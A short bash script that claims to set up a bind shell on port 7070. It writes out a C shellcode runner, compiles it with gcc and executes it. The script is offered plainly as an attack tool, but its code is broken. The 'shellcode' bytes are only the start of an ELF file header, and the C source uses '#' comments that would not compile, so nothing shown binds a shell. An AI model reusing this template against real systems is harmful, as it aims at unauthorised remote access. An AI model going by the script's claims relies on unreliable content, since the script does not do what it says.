
#!/usr/bin/bash
# bind a shell that (7070) 
# demonize your requests.
# author: aliasarin, jhvkvslvljhvkjv@yandex.com
cat > upd.c << EOF # write a .c file
# shellC0de
const char shellcode[]="\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00\xd0\xdb\x49\x00\x00\x00\x00\x00";
#main 
int main() {
    # allocate the pointers to the
    # stack.
    void (*i)() = (void *)shellcode;
    return (*(int(*)())shellcode)(); # execute
}
EOF
# compile it
gcc upd.c -o run
# run.
./run
